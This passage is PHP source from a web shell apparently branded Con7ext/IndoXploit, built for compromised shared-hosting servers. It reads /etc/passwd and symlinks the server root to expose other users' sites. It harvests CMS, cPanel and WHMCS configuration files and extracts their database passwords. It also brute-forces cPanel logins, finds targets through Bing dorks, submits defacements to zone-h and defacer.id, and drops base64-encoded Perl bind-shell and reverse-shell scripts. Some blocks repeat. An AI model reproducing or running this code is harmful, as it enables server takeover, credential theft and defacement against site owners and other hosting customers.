if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

//Vbulletin

$db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

//Other

$db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
echo "<center>
<a href=\"c7e_symconf/root/\">Root Server</a>
<br><a href=\"c7e_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"c7e_symconf/\">Configurations</a></center>";
}
else
{
echo "<center>
<form method=\"POST\">
<textarea name=\"passwd\" class='area' rows='15' cols='60'>";
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
while (list ($key, $val) = each($ara))
{
print "$val:";
}
print "\n";
}}}

flush();
 
echo "</textarea>
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
</form></center>";
}
}
} elseif(isset($_GET['con7ext']) && ($_GET['con7ext'] == 'bing'))
{	@ini_set('output_buffering',0); 
?>
<head>
<style type="text/css">
textarea {
    width: 500px;
    height: 250px;
    border: 1px solid #000000;
    margin: 5px auto;
    padding: 7px;
}
input[type=text] {
	padding-left: 7px;
	width: 250px;
    height: 25px;
    border: 1px solid #000000;
    background: blue;
    margin: 5px auto;
}
</style>
</head>
<center><form method="post">
Bing Dork: <input type="text" name="dork" placeholder="dork" required>
<input type="submit" name="go" value=">>">
</form>
<?php
// coded by Mr. Magnom 
// Re-Coded to Web Based by Mr. Error 404 - IndoXploit
// greetz to Mr. Magnom - Sanjungan Jiwa
function getsource($url, $proxy) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    if($proxy) {
        $proxy = explode(':', autoprox());
        curl_setopt($curl, CURLOPT_PROXY, $proxy[0]);
        curl_setopt($curl, CURLOPT_PROXYPORT, $proxy[1]);
    }
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
$dork = htmlspecialchars($_POST['dork']);
$do = urlencode($dork);
if(isset($_POST['go'])) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$do."&first=".$npage."", $proxy);
	    if($x) {
	        preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
	        foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
	        $npage = $npage + 10;
	        if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
	    } else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
	$sss = count(array_unique($array));
	echo "ToTaL SiTe : $sss<br>";
	foreach($array as $domain) {
		echo "http://$domain/<br>";
	}
}
}elseif($_GET['con7ext'] == 'info') {
echo '<br><table width="700" align="center">
<tr><td>
<center>
System : '.$sys.'<br>
IP : '.$ip.'<br>
Safe Mode : '.$sm.'<br>
Disabled Functions : '.$ds.'<br>
Home_root : '.$home_r.'
</center>
</td></tr>
</table>';
}elseif($_GET['con7ext'] == 'kill') {
$fileini = $_SERVER['SCRIPT_FILENAME'];
rmdir('c7e_sym');rmdir('c7e_conf');unlink($fileini);
echo 'Good By User :)';
}
elseif($_GET['con7ext'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("c7e_sym",0777);
@chdir("c7e_sym");
@exe("ln -s / c7e");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex c7e.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='c7e_sym/c7e/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("c7e_sym",0777);
@chdir("c7e_sym");
exe("ln -s / c7e");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex c7e.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=c7e_sym/c7e/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("c7e_sym",0777);@chdir("c7e_sym");@exe("ln -s / c7e");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex c7e.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=c7e_sym/c7e/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }    
}
elseif($_GET['con7ext'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("c7e_conf", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("c7e_conf/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $c7euser) {
				$user_config_dir = "/home/$c7euser/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$c7euser/.my.cnf" => "cpanel",
						"/home/$c7euser/.accesshash" => "WHM-accesshash",
						"/home/$c7euser/public_html/po-content/config.php" => "Popoji",
						"/home/$c7euser/public_html/vdo_config.php" => "Voodoo",
						"/home/$c7euser/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$c7euser/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$c7euser/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$c7euser/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$c7euser/public_html/whm/configuration.php" => "WHMCS",
						"/home/$c7euser/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$c7euser/public_html/forum/config.php" => "phpBB",
						"/home/$c7euser/public_html/sites/default/settings.php" => "Drupal",
						"/home/$c7euser/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$c7euser/public_html/app/etc/local.xml" => "Magento",
						"/home/$c7euser/public_html/joomla/configuration.php" => "Joomla",
						"/home/$c7euser/public_html/configuration.php" => "Joomla",
						"/home/$c7euser/public_html/wp/wp-config.php" => "WordPress",
						"/home/$c7euser/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$c7euser/public_html/wp-config.php" => "WordPress",
						"/home/$c7euser/public_html/admin/config.php" => "OpenCart",
						"/home/$c7euser/public_html/slconfig.php" => "Sitelok",
						"/home/$c7euser/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("c7e_conf/$c7euser-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<br><center><a href='?path=$path/c7e_conf'><font>Done</font></a></center>";
}elseif($_GET['con7ext'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font><a href='$full/adminer.php' target='_blank'>-> Adminer <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font><a href='$full/adminer.php' target='_blank'>-> Adminer <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['con7ext'] == 'crkcp') {
echo '<center>';
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=green>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=green>$ucp</font>) password (<font color=green>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=green>IndoXploit.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($path) {
			$pass = "";
			$patha = scandir($path);
			foreach($patha as $pathb) {
				if(!is_file("$path/$pathb")) continue;
				$ambil = file_get_contents("$path/$path");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($path);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
}
elseif($_GET['con7ext'] == 'zoneh') {
	if($_POST['submit']) {
echo '<center>';
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Con7ext'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}
elseif($_GET['con7ext'] == 'defid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Con7ext'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='XaiSyndicate'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}elseif($_GET['con7ext'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=green>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=green>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $myuser_jump) {
					$user_jumping_dir = "/home/$myuser_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=green>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $myuser_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}elseif($_GET['con7ext'] == 'network') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
}elseif($_GET['con7ext'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=green>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=green>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $myuser_jump) {
					$user_jumping_dir = "/home/$myuser_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
